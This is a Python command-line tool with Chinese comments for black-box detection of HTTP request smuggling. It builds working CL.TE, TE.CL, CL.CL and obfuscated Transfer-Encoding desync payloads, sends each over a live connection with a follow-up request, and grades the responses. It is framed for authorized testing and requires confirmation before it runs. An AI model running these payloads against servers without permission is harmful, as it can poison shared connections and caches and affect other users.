#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP Request Smuggling 黑盒探测工具 v2.0

仅用于已授权的安全测试。畸形分界请求可能影响目标连接池/缓存状态，
禁止对未授权目标使用；运行前需显式确认授权。

覆盖范围：
  - CL.TE / TE.CL（完整型 + 前缀型毒化）
  - CL.CL（双 Content-Length 取值分歧）
  - TE.TE 及头部变形（冒号前空格 / Tab / 小写 / 逗号 identity / 无效值优先 / obs-fold / hop-by-hop）
  - 基线组：普通 GET / marker 路径 GET / CL-only POST / TE-only POST / 同连接双 GET(流水线)
  - 多轮 × 多延迟复测，唯一 marker，真实 HTTP 响应边界解析（CL / chunked 切分）

不覆盖：HTTP/2 降级型走私（H2.CL/H2.TE，需 HTTP/2 栈）、需特定业务路径触发的场景。

用法：
  python smuggle_probe_v2.py --target https://example.com [--path /] [--rounds 2]
                             [--delays 0.1,0.6] [--verbose] [--yes]
  python smuggle_probe_v2.py --selftest
"""

import argparse
import gzip
import re
import secrets
import socket
import ssl
import sys
import time
import zlib
from dataclasses import dataclass, field
from urllib.parse import urlparse

TIMEOUT_CONNECT = 10
TIMEOUT_READ = 5
RECV_IDLE = 0.5
MAX_RESPONSE = 512 * 1024

MARKER = 'sm' + secrets.token_hex(4)

STATUS_RE = re.compile(rb'^HTTP/\d(?:\.\d)?[ \t]+(\d{3})')


@dataclass
class ResponseInfo:
    status_line: str
    status_code: int
    headers: dict
    body: bytes
    complete: bool
    raw_len: int


@dataclass
class ProbeRecord:
    name: str
    request_repr: str = ''
    request_len: int = 0
    declared_cl: str = ''
    actual_body_len: int = 0
    response_bytes: bytes = b''
    responses: list = field(default_factory=list)
    elapsed: float = 0.0
    first_byte: float = None
    end_reason: str = ''
    error_phase: str = ''
    error: str = ''


@dataclass
class TargetContext:
    marker: str
    expected: int
    baseline_get_code: int = None
    baseline_marker_code: int = None
    baseline_post_code: int = None
    keepalive_ok: bool = False
    front_headers: dict = field(default_factory=dict)


# ---------------------------------------------------------------- 目标解析

def parse_target(user_input):
    url = user_input.strip()
    if not url:
        raise ValueError('必须显式指定目标 URL（本工具不设默认目标，避免误触第三方资产）')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        raise ValueError(f'无法解析主机名: {user_input!r}')
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    use_tls = parsed.scheme == 'https'

    netloc = parsed.netloc
    if '@' in netloc:
        netloc = netloc.rsplit('@', 1)[1]

    hosthdr = netloc
    if netloc.startswith('['):
        m = re.match(r'^(\[[^\]]+\])(?::(\d+))?$', netloc)
        if m and m.group(2) and int(m.group(2)) == port and port in (80, 443):
            hosthdr = m.group(1)
    elif netloc.count(':') == 1:
        h, _, p = netloc.partition(':')
        if p.isdigit() and int(p) == port and port in (80, 443):
            hosthdr = h

    path = parsed.path or '/'
    if not path.startswith('/'):
        path = '/' + path
    query = parsed.query or ''
    return host, port, host, hosthdr, path, query, use_tls


def marker_target(path, query):
    p = path if path.endswith('/') else path.rstrip('/') + '/'
    return f'{p}{MARKER}' + (f'?{query}' if query else '')


def plain_target(path, query):
    return path + (f'?{query}' if query else '')


# ---------------------------------------------------------------- 请求构造

def base_headers():
    return [
        ('User-Agent', 'smuggle-probe/2.0 (authorized-testing-only)'),
        ('Accept', '*/*'),
        ('Accept-Encoding', 'identity'),
        ('Cache-Control', 'no-store'),
        ('Pragma', 'no-cache'),
    ]


def build_get(hosthdr, target, close=True):
    lines = [f'GET {target} HTTP/1.1', f'Host: {hosthdr}']
    for k, v in base_headers():
        lines.append(f'{k}: {v}')
    lines.append(f'Connection: {"close" if close else "keep-alive"}')
    lines.extend(['', ''])
    return '\r\n'.join(lines)


def build_post(hosthdr, target, framing, body):
    lines = [f'POST {target} HTTP/1.1', f'Host: {hosthdr}']
    for k, v in base_headers():
        lines.append(f'{k}: {v}')
    lines.append('Content-Type: application/x-www-form-urlencoded')
    for h in framing:
        lines.append(h)
    if not any(l.lower().lstrip().startswith('connection') for l in framing):
        lines.append('Connection: keep-alive')
    lines.extend(['', body])
    return '\r\n'.join(lines)


def smuggled_get(hosthdr, mpath):
    return (
        f'GET {mpath} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        'Connection: keep-alive\r\n'
        '\r\n'
    )


def poison_cl_te_complete(hosthdr, target, mpath):
    body = '0\r\n\r\n' + smuggled_get(hosthdr, mpath)
    return build_post(hosthdr, target,
                      [f'Content-Length: {len(body)}', 'Transfer-Encoding: chunked'], body)


def poison_cl_te_prefix(hosthdr, target, mpath):
    # 前端按 CL:6 恰好读完；后端按 TE 在终止块处结束，残留 "G" 污染下一请求行
    body = '0\r\n\r\nG'
    return build_post(hosthdr, target,
                      ['Content-Length: 6', 'Transfer-Encoding: chunked'], body)


def poison_te_cl_complete(hosthdr, target, mpath):
    body = '0\r\n\r\n' + smuggled_get(hosthdr, mpath)
    return build_post(hosthdr, target,
                      ['Transfer-Encoding: chunked', f'Content-Length: {len(body)}'], body)


def poison_te_cl_prefix(hosthdr, target, mpath):
    inner = (
        f'GPOST {mpath} HTTP/1.1\r\n'
        f'Host: {hosthdr}\r\n'
        'Content-Length: 0\r\n'
        'Connection: keep-alive\r\n'
        '\r\n'
    ).encode('latin-1')
    h = format(len(inner), 'x')
    cl = len(h) + 2  # 后端按 CL 只读到 chunk 尺寸行，GPOST 从块数据处成为下一请求
    body = f'{h}\r\n'.encode('latin-1') + inner + b'0\r\n\r\n'
    framing = [f'Content-Length: {cl}', 'Transfer-Encoding: chunked']
    return build_post(hosthdr, target, framing, body.decode('latin-1'))


def poison_cl_cl(hosthdr, target, mpath):
    body = '0\r\n\r\n' + smuggled_get(hosthdr, mpath)
    return build_post(hosthdr, target,
                      ['Content-Length: 5', f'Content-Length: {len(body)}'], body)


TE_VARIANTS = [
    ('te_te_xchunked', ['Transfer-Encoding: chunked', 'Transfer-Encoding: xchunked']),
    ('te_space_before_colon', ['Transfer-Encoding : chunked']),
    ('te_tab_after_colon', ['Transfer-Encoding:\tchunked']),
    ('te_chunked_identity', ['Transfer-Encoding: chunked,identity']),
    ('te_invalid_then_valid', ['Transfer-Encoding: cow', 'Transfer-Encoding: chunked']),
    ('te_lowercase', ['transfer-encoding: chunked']),
    ('te_obsfold', ['X-Ignore: x', ' Transfer-Encoding: chunked']),
    ('te_hop_by_hop', ['Transfer-Encoding: chunked', 'Connection: Transfer-Encoding']),
]


def poison_te_variant(te_lines):
    def builder(hosthdr, target, mpath):
        body = '0\r\n\r\n' + smuggled_get(hosthdr, mpath)
        return build_post(hosthdr, target, te_lines + [f'Content-Length: {len(body)}'], body)
    return builder


def build_attack_probes():
    return [
        ('cl_te_complete', poison_cl_te_complete,
         'CL 覆盖全 body + TE：前端按 CL 转发整体，后端按 TE 拆出走私 GET → 多出 marker 响应'),
        ('cl_te_prefix', poison_cl_te_prefix,
         'CL:6 与终止块重合，残留 "G" 前缀 → 受害请求行被污染（400 类响应）'),
        ('te_cl_complete', poison_te_cl_complete,
         'TE + CL 覆盖全 body：前端按 TE 提前截断，后端按 CL 吞掉走私字节 → 响应缺失/停顿'),
        ('te_cl_prefix', poison_te_cl_prefix,
         'CL 只覆盖 chunk 尺寸行，块数据中的 GPOST 成为后端下一请求 → 多出 400 响应'),
        ('cl_cl', poison_cl_cl,
         '双 Content-Length 取值分歧：任一端取 5、另一端取全量即产生错位'),
    ] + [
        (name, poison_te_variant(lines), 'TE 头变形 + CL 兜底：两端对变形 TE 识别不同即错位')
        for name, lines in TE_VARIANTS
    ]


# ---------------------------------------------------------------- 连接与收发

def build_socket(host, port, sni, use_tls):
    raw = socket.create_connection((host, port), timeout=TIMEOUT_CONNECT)
    if not use_tls:
        raw.settimeout(RECV_IDLE)
        return raw
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_alpn_protocols(['http/1.1'])
    except NotImplementedError:
        pass
    s = ctx.wrap_socket(raw, server_hostname=sni)
    s.settimeout(RECV_IDLE)
    return s


def close_quietly(sock):
    if sock is None:
        return
    try:
        sock.close()
    except Exception:
        pass


def count_complete(resps):
    return sum(1 for r in resps if r.complete)


def read_stream(sock, expected=None):
    data = b''
    first_byte = None
    reason = 'eof'
    start = time.time()
    grace_until = None
    while True:
        if time.time() - start > TIMEOUT_READ + 2:
            reason = 'timeout'
            break
        try:
            chunk = sock.recv(8192)
        except socket.timeout:
            if expected is not None and count_complete(parse_http_responses(data)) >= expected:
                reason = 'idle_complete'
            else:
                reason = 'timeout'
            break
        except ConnectionResetError:
            reason = 'rst'
            break
        except (ssl.SSLError, OSError) as e:
            reason = f'error:{type(e).__name__}'
            break
        if not chunk:
            reason = 'eof'
            break
        if first_byte is None:
            first_byte = time.time() - start
        data += chunk
        if len(data) > MAX_RESPONSE:
            reason = 'limit'
            break
        if expected is not None and count_complete(parse_http_responses(data)) >= expected:
            if grace_until is None:
                grace_until = time.time() + 0.3
            elif time.time() >= grace_until:
                reason = 'complete'
                break
    return data, reason, first_byte, time.time() - start


def analyze_request_meta(rec, request_text):
    rec.declared_cl = ', '.join(re.findall(r'(?i)content-length:\s*(\d+)', request_text)) or '-'
    parts = request_text.split('\r\n\r\n', 1)
    rec.actual_body_len = len(parts[1]) if len(parts) == 2 else 0


def send_single(host, port, sni, request, use_tls, name):
    rec = ProbeRecord(name=name, request_repr=repr(request), request_len=len(request))
    analyze_request_meta(rec, request)
    sock = None
    phase = 'connect'
    try:
        sock = build_socket(host, port, sni, use_tls)
        phase = 'send'
        sock.sendall(request.encode('latin-1'))
        phase = 'read'
        data, reason, fb, elapsed = read_stream(sock, expected=1)
        rec.response_bytes, rec.end_reason, rec.first_byte, rec.elapsed = data, reason, fb, elapsed
        rec.responses = parse_http_responses(data)
    except Exception as e:
        rec.error_phase, rec.error = phase, f'{type(e).__name__}: {e}'
    finally:
        close_quietly(sock)
    return rec


def send_dual(host, port, sni, poison, victim, delay, use_tls, name, expected=2):
    rec = ProbeRecord(
        name=name,
        request_repr=repr(poison) + ' ||VICTIM|| ' + repr(victim),
        request_len=len(poison) + len(victim),
    )
    analyze_request_meta(rec, poison)
    sock = None
    phase = 'connect'
    try:
        sock = build_socket(host, port, sni, use_tls)
        phase = 'send_poison'
        sock.sendall(poison.encode('latin-1'))
        phase = 'delay'
        time.sleep(delay)
        phase = 'send_victim'
        sock.sendall(victim.encode('latin-1'))
        phase = 'read'
        data, reason, fb, elapsed = read_stream(sock, expected=expected)
        rec.response_bytes, rec.end_reason, rec.first_byte, rec.elapsed = data, reason, fb, elapsed
        rec.responses = parse_http_responses(data)
    except Exception as e:
        rec.error_phase, rec.error = phase, f'{type(e).__name__}: {e}'
    finally:
        close_quietly(sock)
    return rec


# ---------------------------------------------------------------- HTTP 响应解析

def find_chunked_end(data, pos):
    n = len(data)
    while pos < n:
        nl = data.find(b'\r\n', pos)
        if nl == -1:
            return None
        size_field = data[pos:nl].split(b';')[0].strip()
        try:
            size = int(size_field, 16)
        except ValueError:
            return None
        if size == 0:
            if data[nl + 2:nl + 4] == b'\r\n':
                return nl + 4
            t = data.find(b'\r\n\r\n', nl)
            return t + 4 if t != -1 else None
        pos = nl + 2 + size
        if pos + 2 > n:
            return None
        pos += 2
    return None


def parse_http_responses(data):
    responses = []
    offset = 0
    n = len(data)
    while offset < n:
        idx = data.find(b'\r\n\r\n', offset)
        if idx == -1:
            break
        head = data[offset:idx]
        lines = head.split(b'\r\n')
        m = STATUS_RE.match(lines[0])
        if not m:
            break
        code = int(m.group(1))
        status_line = lines[0].decode('latin-1', 'replace')
        headers = {}
        for ln in lines[1:]:
            if not ln or ln[:1] in (b' ', b'\t'):
                continue
            if b':' in ln:
                k, v = ln.split(b':', 1)
                headers[k.decode('latin-1').strip().lower()] = v.decode('latin-1').strip()
        body_start = idx + 4
        te = headers.get('transfer-encoding', '').lower()

        def finish(body, complete, end_offset):
            responses.append(ResponseInfo(status_line, code, headers, body, complete, end_offset - offset))

        if 100 <= code < 200 or code in (204, 304):
            finish(b'', True, body_start)
            offset = body_start
        elif 'chunked' in te:
            end = find_chunked_end(data, body_start)
            if end is None:
                finish(data[body_start:], False, n)
                break
            finish(data[body_start:end], True, end)
            offset = end
        elif 'content-length' in headers:
            try:
                cl = int(headers['content-length'])
            except ValueError:
                cl = -1
            if cl < 0:
                finish(data[body_start:], True, n)
                break
            body_end = body_start + cl
            if body_end > n:
                finish(data[body_start:], False, n)
                break
            finish(data[body_start:body_end], True, body_end)
            offset = body_end
        else:
            finish(data[body_start:], True, n)
            break
    return responses


def body_text(resp):
    raw = resp.body
    enc = resp.headers.get('content-encoding', '').lower()
    if 'gzip' in enc or raw[:2] == b'\x1f\x8b':
        try:
            raw = gzip.decompress(raw)
        except OSError:
            pass
    elif 'deflate' in enc:
        try:
            raw = zlib.decompress(raw)
        except zlib.error:
            try:
                raw = zlib.decompress(raw, -15)
            except zlib.error:
                pass
    return raw.decode('utf-8', 'replace')


def response_contains_marker(resp, marker):
    if marker in resp.status_line:
        return True
    if any(marker in v for v in resp.headers.values()):
        return True
    return marker in body_text(resp)


# ---------------------------------------------------------------- 信号与判定

MEDIUM_PREFIXES = ('extra_response', 'missing_response', 'victim_anomaly', 'conn_closed_after_poison')
REJECT_CODES = (400, 411, 413, 417, 421)
WAF_CODES = (403, 406, 429)


def round_signals(rec, ctx):
    sigs = []
    if rec.error_phase:
        if rec.error_phase == 'send_victim':
            sigs.append('conn_closed_after_poison')
        elif rec.error_phase == 'send_poison':
            sigs.append('conn_rejected_poison')
        return sigs
    parsed = rec.responses
    codes = [r.status_code for r in parsed]
    marker_idx = [i for i, r in enumerate(parsed) if response_contains_marker(r, ctx.marker)]

    if len(parsed) > ctx.expected:
        sigs.append(f'extra_response({len(parsed)})')
    if len(parsed) < ctx.expected and rec.end_reason in ('timeout', 'limit'):
        sigs.append(f'missing_response({len(parsed)})')
    if marker_idx:
        if any(i > 0 for i in marker_idx):
            sigs.append('marker_response')
        else:
            sigs.append('marker_echo_first_only')
    if codes:
        if codes[0] in REJECT_CODES:
            sigs.append('framing_rejected')
        elif codes[0] in WAF_CODES:
            sigs.append('waf_block')
        elif codes[0] >= 500:
            sigs.append('gateway_error')
        known = {ctx.baseline_get_code, ctx.baseline_post_code}
        if len(codes) >= 2 and codes[-1] not in known and None not in known:
            sigs.append(f'victim_anomaly({codes[-1]})')
    return sigs


def aggregate(records, ctx):
    rounds = [round_signals(r, ctx) for r in records]
    strong = sum(1 for s in rounds if 'marker_response' in s)
    med = sum(1 for s in rounds if any(x.startswith(MEDIUM_PREFIXES) for x in s))
    weak = sum(1 for s in rounds if 'marker_echo_first_only' in s)
    if strong >= 2:
        level = 'HIGH'
    elif strong == 1 or med >= 2:
        level = 'MEDIUM'
    elif med == 1 or weak >= 1:
        level = 'LOW'
    else:
        level = 'NONE'
    return level, rounds


VERDICT_TEXT = {
    'HIGH': '高置信 — 多轮复现 marker 响应错位，强烈提示请求走私，建议在授权范围内深入验证',
    'MEDIUM': '中置信 — 响应数量/归属偏差可复现，可疑信号，需结合响应边界与业务行为确认',
    'LOW': '低置信 — 孤立异常（单次出现或仅回显），不足以支撑结论，可能为噪声',
    'NONE': '未观察到异常 — 与基线一致（不代表目标安全，仅代表当前探针未触发）',
}


# ---------------------------------------------------------------- 执行流程

def first_code(rec):
    return rec.responses[0].status_code if rec.responses else None


def run_baselines(host, port, sni, hosthdr, path, query, use_tls):
    print('[*] 阶段 1/3：基线采集')
    tgt = plain_target(path, query)
    mpath = marker_target(path, query)

    b_get = send_single(host, port, sni, build_get(hosthdr, tgt, close=True), use_tls, 'b_get')
    b_marker = send_single(host, port, sni, build_get(hosthdr, mpath, close=True), use_tls, 'b_marker')
    b_post = send_single(
        host, port, sni,
        build_post(hosthdr, tgt, ['Content-Length: 3'], 'a=1'),
        use_tls, 'b_post_cl')
    b_post_te = send_single(
        host, port, sni,
        build_post(hosthdr, tgt, ['Transfer-Encoding: chunked'], '1\r\na\r\n0\r\n\r\n'),
        use_tls, 'b_post_te')
    pipe = send_dual(
        host, port, sni,
        build_get(hosthdr, tgt, close=False),
        build_get(hosthdr, tgt, close=True),
        0.1, use_tls, 'b_pipeline', expected=2)

    for r in (b_get, b_marker, b_post, b_post_te, pipe):
        codes = [x.status_code for x in r.responses]
        print(f'    {r.name:<12} codes={codes} end={r.end_reason or r.error_phase} '
              f'elapsed={r.elapsed:.2f}s {("err=" + r.error) if r.error else ""}')

    ctx = TargetContext(
        marker=MARKER,
        expected=2,
        baseline_get_code=first_code(b_get),
        baseline_marker_code=first_code(b_marker),
        baseline_post_code=first_code(b_post),
        keepalive_ok=count_complete(pipe.responses) >= 2,
    )
    if b_get.responses:
        for k in ('server', 'via', 'x-cache', 'x-served-by', 'cf-ray', 'x-request-id'):
            if k in b_get.responses[0].headers:
                ctx.front_headers[k] = b_get.responses[0].headers[k]

    print(f'    基线: GET={ctx.baseline_get_code} marker路径={ctx.baseline_marker_code} '
          f'POST(CL)={ctx.baseline_post_code} keep-alive双响应={"是" if ctx.keepalive_ok else "否(同连接复测解释力受限)"}')
    if ctx.front_headers:
        print(f'    前端特征头: {ctx.front_headers}')
    if ctx.baseline_get_code in REJECT_CODES or ctx.baseline_get_code in WAF_CODES or \
            (ctx.baseline_get_code or 0) >= 500:
        print('    [!] 基线本身即为拦截/错误响应，后续"异常状态码"类信号将自动降权解释')
    return ctx


def run_attacks(host, port, sni, hosthdr, path, query, use_tls, delays, ctx):
    print(f'[*] 阶段 2/3：攻击探针（marker={MARKER}，{len(delays)} 轮，延迟 {delays}）')
    victim = build_get(hosthdr, plain_target(path, query), close=True)
    tgt = plain_target(path, query)
    mpath = marker_target(path, query)
    results = {}
    for name, builder, desc in build_attack_probes():
        print(f'  [-] {name}: {desc}')
        recs = []
        for d in delays:
            poison = builder(hosthdr, tgt, mpath)
            rec = send_dual(host, port, sni, poison, victim, d, use_tls, f'{name}@{d}s')
            recs.append(rec)
            codes = [x.status_code for x in rec.responses]
            mk = any(response_contains_marker(x, MARKER) for x in rec.responses)
            print(f'      d={d:.2f}s resp={len(rec.responses)} codes={codes} '
                  f'marker={"Y" if mk else "-"} end={rec.end_reason or rec.error_phase}'
                  + (f' err={rec.error_phase}:{rec.error}' if rec.error else ''))
        results[name] = recs
    return results


def report(results, ctx, verbose):
    print('[*] 阶段 3/3：判定（按风险分级，不做"确认/安全"式断言）')
    summary = {'HIGH': [], 'MEDIUM': [], 'LOW': [], 'NONE': []}
    for name, recs in results.items():
        level, rounds = aggregate(recs, ctx)
        summary[level].append(name)
        print(f'  [{name}] {level}')
        for rec, sigs in zip(recs, rounds):
            print(f'      {rec.name}: signals={sigs or "无"}')
        if verbose:
            for rec in recs:
                print(f'      --- {rec.name} req_len={rec.request_len} declared_CL={rec.declared_cl} '
                      f'actual_body={rec.actual_body_len} resp_len={len(rec.response_bytes)} '
                      f'first_byte={rec.first_byte if rec.first_byte is None else round(rec.first_byte, 3)}')
                print(f'      req={rec.request_repr[:600]}')
                print(f'      resp={repr(rec.response_bytes[:1200])}')
        print(f'      结论: {VERDICT_TEXT[level]}')

    print()
    print('=== 综合结论 ===')
    for lv in ('HIGH', 'MEDIUM', 'LOW'):
        names = summary[lv]
        print(f'{VERDICT_TEXT[lv].split(" — ")[0]}: {", ".join(names) if names else "无"}')
    if not (summary['HIGH'] or summary['MEDIUM']):
        print('未观察到异常: 所有探针与基线一致')
    print()
    print('说明：')
    print('  1. 本工具未覆盖 HTTP/2 降级型走私及需特定业务路径/时机触发的变体；"未观察到异常"不等于安全。')
    print('  2. 结果受负载均衡多后端、缓存、WAF 策略与网络抖动影响，建议不同时段复测。')
    print('  3. 若基线显示目标对畸形分界头显式拒绝（400/411 类），通常为防护有效的迹象，而非 desync。')
    print('  4. 高置信结果也仅代表黑盒行为证据，出具报告前应结合响应边界逐字节复核。')


# ---------------------------------------------------------------- 自检与入口

def selftest():
    d = (b'HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello'
         b'HTTP/1.1 404 Not Found\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\n0\r\n\r\n'
         b'HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n')
    rs = parse_http_responses(d)
    assert [r.status_code for r in rs] == [200, 404, 400], [r.status_code for r in rs]
    assert rs[0].body == b'hello'
    assert rs[1].complete and rs[2].complete

    d2 = b'HTTP/1.1 200 OK\r\nContent-Length: 22\r\n\r\nbody with HTTP/1.1 200 OK fake\r\n'
    rs2 = parse_http_responses(d2)
    assert len(rs2) == 1, '响应体内的伪状态行不应被计为独立响应'

    d3 = b'HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\nX-T: 1\r\n\r\n'
    rs3 = parse_http_responses(d3)
    assert len(rs3) == 1 and rs3[0].complete, '带 trailer 的 chunked 响应应完整切分'

    print('[+] selftest 通过：多响应切分 / 伪状态行免疫 / chunked+trailer 解析 均正常')
    return 0


def main():
    ap = argparse.ArgumentParser(description='HTTP Request Smuggling 探测工具 v2.0（仅限授权测试）')
    ap.add_argument('--target', help='目标 URL，例如 https://example.com（不提供则交互式询问，无默认值）')
    ap.add_argument('--path', default='/', help='基准路径（默认 /）')
    ap.add_argument('--rounds', type=int, default=2, help='每个探针的轮数（默认 2，每轮使用不同延迟）')
    ap.add_argument('--delays', default='0.1,0.6', help='毒化与受害请求间的延迟序列，逗号分隔（默认 0.1,0.6）')
    ap.add_argument('--verbose', action='store_true', help='输出请求/响应原始字节（转义视图）')
    ap.add_argument('--yes', action='store_true', help='跳过授权确认（用于自动化，需自行保证已获授权）')
    ap.add_argument('--selftest', action='store_true', help='离线自检响应解析器，不发起任何网络请求')
    args = ap.parse_args()

    if args.selftest:
        return selftest()

    print('=== HTTP Request Smuggling 探测工具 v2.0 ===')
    print('[!] 仅限对已授权目标使用。畸形分界请求可能影响目标连接池与缓存状态；')
    print('[!] 本工具不设默认目标，避免误触第三方资产。')
    print()

    target = args.target
    if not target:
        try:
            target = input('输入已授权的目标 URL (必填): ').strip()
        except EOFError:
            target = ''
    if not args.yes:
        try:
            confirm = input(f'确认已获得对 {target or "(未填写)"} 的测试授权并继续? [y/N]: ').strip().lower()
        except EOFError:
            confirm = ''
        if confirm != 'y':
            print('[!] 未确认授权，退出。')
            return 1

    try:
        host, port, sni, hosthdr, path, query, use_tls = parse_target(target)
    except ValueError as e:
        print(f'[!] 输入错误: {e}')
        return 1
    if args.path != '/':
        path = args.path if args.path.startswith('/') else '/' + args.path
        query = ''

    delays = []
    for part in args.delays.split(','):
        part = part.strip()
        if part:
            delays.append(float(part))
    if not delays:
        delays = [0.1, 0.6]
    rounds = max(args.rounds, 1)
    delays = [delays[i % len(delays)] for i in range(rounds * len(delays))]

    print(f'[*] 目标: {host}:{port} TLS={use_tls} SNI={sni} Host={hosthdr} 基准路径={path}')
    print(f'[*] 唯一 marker: {MARKER}（每轮探测独立生成于进程启动时，避免与历史缓存/日志混淆）')
    print()

    try:
        ctx = run_baselines(host, port, sni, hosthdr, path, query, use_tls)
        results = run_attacks(host, port, sni, hosthdr, path, query, use_tls, delays, ctx)
    except KeyboardInterrupt:
        print('\n[!] 用户中断。')
        return 1

    print()
    report(results, ctx, args.verbose)
    return 0


if __name__ == '__main__':
    sys.exit(main())
